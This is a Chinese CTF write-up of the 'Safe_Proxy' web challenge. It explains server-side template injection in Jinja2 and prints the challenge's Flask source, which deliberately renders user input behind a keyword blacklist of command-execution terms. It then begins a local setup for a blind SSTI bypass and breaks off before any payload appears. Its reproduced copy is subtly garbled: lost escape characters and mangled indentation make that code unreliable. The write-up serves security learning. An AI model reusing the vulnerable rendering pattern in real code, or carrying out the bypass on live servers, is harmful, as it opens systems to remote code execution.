<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>第二届‘长城杯’WEB篇—Safe_Prosy</title>
      <link href="/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFWEB%E7%AF%87-safe_proxy/"/>
      <url>/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFWEB%E7%AF%87-safe_proxy/</url>
      
        <content type="html"><![CDATA[<h1 id="Safe-Proxy"><a href="#Safe-Proxy" class="headerlink" title="Safe_Proxy"></a>Safe_Proxy</h1><h2 id="一、-前言：简单介绍SSTI"><a href="#一、-前言：简单介绍SSTI" class="headerlink" title="一、 前言：简单介绍SSTI"></a>一、 前言：简单介绍SSTI</h2><p>SSTI（Server-Side Template Injection，服务器端模板注入）是一种常见的 Web 安全漏洞，发生在 Web 应用程序在服务器端使用模板引擎渲染动态内容时。<br>攻击者通过向应用程序的模板输入中注入恶意的模板语法，从而能够执行任意的代码或命令，甚至获取应用服务器上的敏感信息。</p><h3 id="（一）-SSTI工作原理"><a href="#（一）-SSTI工作原理" class="headerlink" title="（一） SSTI工作原理"></a>（一） SSTI工作原理</h3><p>许多 Web 应用程序都使用模板引擎（例如 Jinja2、Thymeleaf、FreeMarker 等）来生成动态 HTML 内容。<br>模板引擎通过模板语法将变量和控制结构嵌入到静态 HTML 中。SSTI 漏洞通常出现在 Web 应用没有对用户输入进行充分过滤时，攻击者可以将恶意代码注入到模板渲染过程中。<br>攻击者通过构造包含恶意模板代码的输入，服务器端的模板引擎在渲染时会执行这些代码，导致潜在的代码执行或信息泄露。</p><h3 id="（二）-SSTI常见攻击"><a href="#（二）-SSTI常见攻击" class="headerlink" title="（二） SSTI常见攻击"></a>（二） SSTI常见攻击</h3><ol><li>代码执行</li></ol><p>攻击者可以注入特定的模板语法（如 Jinja2 或其他引擎的语法），通过模板引擎的执行环境运行恶意代码，执行服务器上的任意操作，例如读取文件、执行系统命令等。</p><ol start="2"><li>信息泄露</li></ol><p>攻击者可以通过模板注入获取 Web 应用服务器的一些敏感信息，例如环境变量、配置文件、数据库信息等。<br>这通常是通过泄露内存中的对象、类或函数信息来实现的。</p><ol start="3"><li>绕过访问控制</li></ol><p>在某些情况下，攻击者可以利用 SSTI 漏洞绕过 Web 应用的认证或授权机制，访问通常不允许访问的页面或功能。</p><h3 id="（三）-常见的模板引擎"><a href="#（三）-常见的模板引擎" class="headerlink" title="（三） 常见的模板引擎"></a>（三） 常见的模板引擎</h3><ul><li>Jinja2（Python）</li><li>Thymeleaf（Java）</li><li>FreeMarker（Java）</li><li>Handlebars（JavaScript）</li><li>Mustache（多语言）</li></ul><h2 id="二、-题目分析"><a href="#二、-题目分析" class="headerlink" title="二、 题目分析"></a>二、 题目分析</h2><ol><li>关键点分析</li></ol><ul><li>这道题考的就是<em><strong>SSTI注入</strong></em>，waf的东西不是很多，</li><li>主要的一个关键点就是<em><strong>绕过黑名单</strong></em></li><li>给的python代码，显然题目用的就是<em><strong>Jinja2模板引擎</strong></em></li></ul><ol start="2"><li>代码分析</li></ol><p>拿到题目后，给了段代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>+html.escape(f.read())+<span class="string">&#x27;&lt;/pre&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>():</span><br><span class="line">    template_code = request.form.get(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">    <span class="comment"># 安全过滤</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> template_code:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Forbidden content detected!&quot;</span></span><br><span class="line">    result = render_template_string(template_code)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span> <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HTTPProxyHandler</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_host, target_port</span>):</span><br><span class="line">        <span class="variable language_">self</span>.target_host = target_host</span><br><span class="line">        <span class="variable language_">self</span>.target_port = target_port</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_request</span>(<span class="params">self, client_socket</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            request_data = <span class="string">b&quot;&quot;</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                chunk = client_socket.recv(<span class="number">4096</span>)</span><br><span class="line">                request_data += chunk</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(chunk) &lt; <span class="number">4096</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> request_data:</span><br><span class="line">                client_socket.close()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> proxy_socket:</span><br><span class="line">                proxy_socket.connect((<span class="variable language_">self</span>.target_host, <span class="variable language_">self</span>.target_port))</span><br><span class="line">                proxy_socket.sendall(request_data)</span><br><span class="line"></span><br><span class="line">                response_data = <span class="string">b&quot;&quot;</span></span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    chunk = proxy_socket.recv(<span class="number">4096</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    response_data += chunk</span><br><span class="line"></span><br><span class="line">            header_end = response_data.rfind(<span class="string">b&quot;\r\n\r\n&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> header_end != -<span class="number">1</span>:</span><br><span class="line">                body = response_data[header_end + <span class="number">4</span>:]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                body = response_data</span><br><span class="line">                </span><br><span class="line">            response_body = body</span><br><span class="line">            response = <span class="string">b&quot;HTTP/1.1 200 OK\r\n&quot;</span> \</span><br><span class="line">                       <span class="string">b&quot;Content-Length: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(response_body)).encode() + <span class="string">b&quot;\r\n&quot;</span> \</span><br><span class="line">                       <span class="string">b&quot;Content-Type: text/html; charset=utf-8\r\n&quot;</span> \</span><br><span class="line">                       <span class="string">b&quot;\r\n&quot;</span> + response_body</span><br><span class="line"></span><br><span class="line">            client_socket.sendall(response)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Proxy Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_proxy_server</span>(<span class="params">host, port, target_host, target_port</span>):</span><br><span class="line">    proxy_handler = HTTPProxyHandler(target_host, target_port)</span><br><span class="line">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server_socket.bind((host, port))</span><br><span class="line">    server_socket.listen(<span class="number">100</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Proxy server is running on <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span> and forwarding to <span class="subst">&#123;target_host&#125;</span>:<span class="subst">&#123;target_port&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket, addr = server_socket.accept()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Connection from <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line">            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))</span><br><span class="line">            thread.daemon = <span class="literal">True</span></span><br><span class="line">            thread.start()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Shutting down proxy server...&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        server_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_flask_app</span>():</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    proxy_host = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    proxy_port = <span class="number">5001</span></span><br><span class="line">    target_host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    target_port = <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 安全反代，防止针对响应头的攻击</span></span><br><span class="line">    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))</span><br><span class="line">    proxy_thread.daemon = <span class="literal">True</span></span><br><span class="line">    proxy_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting Flask app...&quot;</span>)</span><br><span class="line">    run_flask_app()</span><br></pre></td></tr></table></figure><h3 id="（一）概要分析"><a href="#（一）概要分析" class="headerlink" title="（一）概要分析"></a>（一）概要分析</h3><p>这段代码结合了 Flask Web 应用和一个 HTTP 代理服务器。<br>它创建了一个简单的 Web 应用，通过 Flask 提供了两个路由，一个用来展示代码源文件的内容，另一个用来渲染用户提交的模板代码。<br>此外，还实现了一个基本的 HTTP 代理功能，可以将客户端的请求转发到目标服务器，并处理响应。<br>代码运行在两个线程中：一个用于 Flask Web 应用，另一个用于代理服务器。</p><h3 id="（二）-Flask-应用分析"><a href="#（二）-Flask-应用分析" class="headerlink" title="（二） Flask 应用分析"></a>（二） Flask 应用分析</h3><ol><li><p><strong>Flask 路由</strong>：</p><ul><li>**<code>GET /</code>**：<ul><li>打开当前脚本文件并返回其内容，使用 <code>html.escape</code> 进行 HTML 转义，以防止 XSS（跨站脚本攻击）。</li></ul></li><li>**<code>POST /</code>**：<ul><li>从表单获取 <code>code</code> 参数，这个参数包含了用户提供的模板代码。</li><li>进行简单的安全过滤：检查代码中是否包含一些可能危险的字符串，如 <code>__</code>、<code>import</code>、<code>os</code> 等。若发现这些危险字符，会返回 <code>&quot;Forbidden content detected!&quot;</code>。</li><li>如果代码通过过滤，则使用 <code>render_template_string</code> 渲染这个模板并返回结果。如果渲染成功，则返回 <code>ok</code>；如果渲染失败，则返回 <code>error</code>。</li></ul></li></ul></li><li><p><strong>安全过滤问题</strong>：</p><ul><li>目前的安全过滤逻辑过于简单，只检查了 <code>code</code> 中是否包含一些危险的关键字。这样的方法可能不够完善，因为攻击者可以通过各种方式绕过这些简单的字符串检查（例如通过混淆字符、编码绕过等）。</li><li>更有效的做法是使用更精细的代码审计和沙箱环境来确保用户提供的模板代码不会执行恶意操作。</li></ul></li></ol><h3 id="（三）-HTTP-代理服务器分析"><a href="#（三）-HTTP-代理服务器分析" class="headerlink" title="（三） HTTP 代理服务器分析"></a>（三） HTTP 代理服务器分析</h3><ol><li><p><strong><code>HTTPProxyHandler</code> 类</strong>：</p><ul><li>该类用于处理客户端请求，将请求转发到目标服务器，并将目标服务器的响应返回给客户端。</li><li>它使用 <code>socket</code> 库进行网络通信。客户端请求数据通过 <code>recv()</code> 接收并转发到目标服务器，然后接收目标服务器的响应并转发给客户端。</li></ul></li><li><p><strong><code>start_proxy_server</code> 函数</strong>：</p><ul><li>启动一个代理服务器，监听指定的端口，并处理多个客户端连接。</li><li>每当一个客户端连接时，创建一个新的线程处理该请求，确保支持并发。</li></ul></li><li><p>**<code>安全反代</code>**：</p><ul><li>代理服务器通过将请求转发到目标服务器（Flask 应用）来处理响应。这有助于防止一些针对 Flask 应用的攻击（例如某些针对 HTTP 头部的攻击），但它依赖于正确的实现和配置。代理服务器的简单实现并没有加入更多的安全措施，如请求过滤或身份验证等。</li></ul></li></ol><h3 id="（四）代码安全性分析"><a href="#（四）代码安全性分析" class="headerlink" title="（四）代码安全性分析"></a>（四）代码安全性分析</h3><ol><li><p>**SSTI (Server-Side Template Injection)**：</p><ul><li>Flask 使用了 <code>render_template_string</code> 来渲染用户提供的模板代码，潜在的风险是 <strong>SSTI</strong> 漏洞。恶意用户可以提交恶意模板代码，导致执行任意代码（例如文件读取、命令执行等）。</li><li>对用户输入的过滤机制（检查 <code>import</code>、<code>os</code> 等）是基础的，但不足以防范复杂的模板注入攻击。攻击者可能通过混淆技术绕过这些检查。</li><li>如果用户提交的模板代码没有被正确过滤，攻击者可以注入并执行恶意的 Python 代码。</li></ul></li><li><p><strong>代理服务器的潜在问题</strong>：</p><ul><li>虽然代理服务器能够隐藏原始 Flask 应用的详细信息，但其实现存在一些安全风险：<ul><li><strong>没有处理 HTTPS</strong>：如果客户端和代理服务器之间使用 HTTP 明文传输，可能会暴露敏感数据（如身份验证信息）。</li><li><strong>没有进行请求验证</strong>：代理服务器将请求转发到目标服务器而不进行任何安全检查，攻击者可以利用它绕过一些服务器端的防护措施。</li><li><strong>缺乏完整的错误处理和日志</strong>：代理服务器没有针对连接错误、目标服务器错误或数据包注入进行完整的错误处理，这可能导致服务中断或安全漏洞。</li></ul></li></ul></li><li><p><strong>可能的攻击场景</strong>：</p><ul><li><strong>SSTI 攻击</strong>：攻击者提交恶意模板代码，通过 <code>render_template_string</code> 执行不安全的操作，如访问文件、执行系统命令等。</li><li><strong>代理滥用</strong>：攻击者可以利用代理服务器访问目标服务器的内部服务，绕过防火墙等安全机制。</li><li><strong>服务拒绝攻击</strong>：由于代理服务器将所有流量转发到目标服务器，可能会成为服务拒绝攻击的目标，特别是没有对请求做限制的情况下。</li></ul></li></ol><h3 id="（三）-思路分析"><a href="#（三）-思路分析" class="headerlink" title="（三） 思路分析"></a>（三） 思路分析</h3><ol><li>请求方式</li></ol><ul><li><p>使用get访问会读取当前的python脚本的内容 并返回源码</p></li><li><p>使用post方法会获取code的内容 黑名单进行过滤 然后渲染模板</p></li></ul><ol start="2"><li>绕过过滤<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;n&#x27;</span>]</span><br></pre></td></tr></table></figure>需要传递的参数为code，内容都在code的键中</li></ol><p>当前是无回显的ssti</p><p>我们要进行<em><strong>无回显的绕过构造</strong></em></p><p>我们可以使用hackbar&#x2F;fenjing来自动构造payload</p><ol start="3"><li>我们有黑名单 我们可以本地起一个ssti</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():    </span><br><span class="line">   <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:        </span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>+html.escape(f.read())+<span class="string">&#x27;&lt;/pre&gt;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>():    </span><br><span class="line">   template_code = request.form.get(<span class="string">&quot;code&quot;</span>)    <span class="comment"># 安全过滤    </span></span><br><span class="line">   blacklist = [<span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;n&#x27;</span>]    </span><br><span class="line">   <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:        </span><br><span class="line">      <span class="keyword">if</span> black <span class="keyword">in</span> template_code:            </span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;Forbidden content detected!&quot;</span>    </span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">         result = render_template_string(template_code)</span><br><span class="line">         <span class="keyword">return</span> result  <span class="comment"># 直接返回渲染后的模板内容    </span></span><br><span class="line">      <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">         <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>  <span class="comment"># 返回错误信息</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HTTPProxyHandler</span>:    </span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_host, target_port</span>):        </span><br><span class="line">      <span class="variable language_">self</span>.target_host = target_host        </span><br><span class="line">      <span class="variable language_">self</span>.target_port = target_port    </span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">handle_request</span>(<span class="params">self, client_socket</span>):        </span><br><span class="line">      <span class="keyword">try</span>:           </span><br><span class="line">         request_data = <span class="string">b&quot;&quot;</span>            </span><br><span class="line">         <span class="keyword">while</span> <span class="literal">True</span>:                </span><br><span class="line">            chunk = client_socket.recv(<span class="number">4096</span>)                </span><br><span class="line">            request_data += chunk                </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(chunk) &lt; <span class="number">4096</span>:                    </span><br><span class="line">               <span class="keyword">break</span>            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> request_data:                </span><br><span class="line">               client_socket.close()                </span><br><span class="line">               <span class="keyword">return</span>            </span><br><span class="line">            <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> proxy_socket:</span><br><span class="line">               proxy_socket.connect((<span class="variable language_">self</span>.target_host, <span class="variable language_">self</span>.target_port))                proxy_socket.sendall(request_data)                </span><br><span class="line">               response_data = <span class="string">b&quot;&quot;</span>                </span><br><span class="line">               <span class="keyword">while</span> <span class="literal">True</span>:                    </span><br><span class="line">                  chunk = proxy_socket.recv(<span class="number">4096</span>)                    </span><br><span class="line">                  <span class="keyword">if</span> <span class="keyword">not</span> chunk:                        </span><br><span class="line">                     <span class="keyword">break</span>                    </span><br><span class="line">                  response_data += chunk            </span><br><span class="line">            header_end = response_data.rfind(<span class="string">b&quot;rnrn&quot;</span>)            </span><br><span class="line">            <span class="keyword">if</span> header_end != -<span class="number">1</span>:                </span><br><span class="line">               body = response_data[header_end + <span class="number">4</span>:]            </span><br><span class="line">            <span class="keyword">else</span>:                </span><br><span class="line">               body = response_data                            </span><br><span class="line">               response_body = body            </span><br><span class="line">               response = <span class="string">b&quot;HTTP/1.1 200 OK\r\n&quot;</span> \</span><br><span class="line">                       <span class="string">b&quot;Content-Length: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(response_body)).encode() + <span class="string">b&quot;\r\n&quot;</span> \</span><br><span class="line">                       <span class="string">b&quot;Content-Type: text/html; charset=utf-8\r\n&quot;</span> \</span><br><span class="line">                       <span class="string">b&quot;\r\n&quot;</span> + response_body</span><br><span class="line">               client_socket.sendall(response)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">f&quot;Proxy Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            client_socket.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_proxy_server</span>(<span class="params">host, port, target_host, target_port</span>):</span><br><span class="line">    proxy_handler = HTTPProxyHandler(target_host, target_port)</span><br><span class="line">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server_socket.bind((host, port))</span><br><span class="line">    server_socket.listen(<span class="number">100</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Proxy server is running on <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span> and forwarding to <span class="subst">&#123;target_host&#125;</span>:<span class="subst">&#123;target_port&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket, addr = server_socket.accept()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Connection from <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line">            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))</span><br><span class="line">            thread.daemon = <span class="literal">True</span></span><br><span class="line">            thread.start()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Shutting down proxy server...&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        server_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_flask_app</span>():</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    proxy_host = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    proxy_port = <span class="number">5001</span></span><br><span class="line">    target_host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    target_port = <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 安全反代，防止针对响应头的攻击</span></span><br><span class="line">    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))</span><br><span class="line">    proxy_thread.daemon = <span class="literal">True</span></span><br><span class="line">    proxy_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting Flask app...&quot;</span>)</span><br><span class="line">    run_flask_app()</span><br></pre></td></tr></table></figure><ol start="4"><li>本地运行<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\app.py</span><br></pre></td></tr></table></figure></li></ol><p>显示:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">starting Flask 